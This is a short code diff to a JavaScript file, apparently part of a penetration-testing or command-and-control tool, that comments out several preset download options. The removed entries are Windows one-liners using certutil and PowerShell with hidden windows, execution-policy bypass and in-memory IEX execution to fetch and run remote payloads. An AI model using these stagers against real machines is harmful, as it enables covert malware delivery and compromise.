@@ -32,31 +32,31 @@ const downloadFileWayDetail = item => {
       name: '浏览器下载',
       cmd: `${download_url}`,
     },
-    {
-      key: '1',
-      name: 'certutil下载',
-      cmd: `cmd.exe /c certutil -urlcache -split -f ${download_url} C:\\ProgramData\\${filename}`,
-    },
-    {
-      key: '2',
-      name: 'powershell下载',
-      cmd: `cmd.exe /c powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile('${download_url}','${filename}');`,
-    },
-    {
-      key: '3',
-      name: 'powershell内存执行',
-      cmd: `cmd.exe /c powershell -windowstyle hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('${download_url}');"`,
-    },
-    {
-      key: '4',
-      name: 'certutil下载执行exe',
-      cmd: `cmd.exe /c certutil -urlcache -split -f ${download_url} C:\\ProgramData\\${filename} && C:\\ProgramData\\${filename}`,
-    },
-    {
-      key: '5',
-      name: 'powershell下载执行exe',
-      cmd: `cmd.exe /c powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile('${download_url}','${filename}');start-process ${filename}`,
-    },
+    // {
+    //   key: '1',
+    //   name: 'certutil下载',
+    //   cmd: `cmd.exe /c certutil -urlcache -split -f ${download_url} C:\\ProgramData\\${filename}`,
+    // },
+    // {
+    //   key: '2',
+    //   name: 'powershell下载',
+    //   cmd: `cmd.exe /c powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile('${download_url}','${filename}');`,
+    // },
+    // {
+    //   key: '3',
+    //   name: 'powershell内存执行',
+    //   cmd: `cmd.exe /c powershell -windowstyle hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('${download_url}');"`,
+    // },
+    // {
+    //   key: '4',
+    //   name: 'certutil下载执行exe',
+    //   cmd: `cmd.exe /c certutil -urlcache -split -f ${download_url} C:\\ProgramData\\${filename} && C:\\ProgramData\\${filename}`,
+    // },
+    // {
+    //   key: '5',
+    //   name: 'powershell下载执行exe',
+    //   cmd: `cmd.exe /c powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile('${download_url}','${filename}');start-process ${filename}`,
+    // },
     {
       key: '6',
       name: 'linux下载',
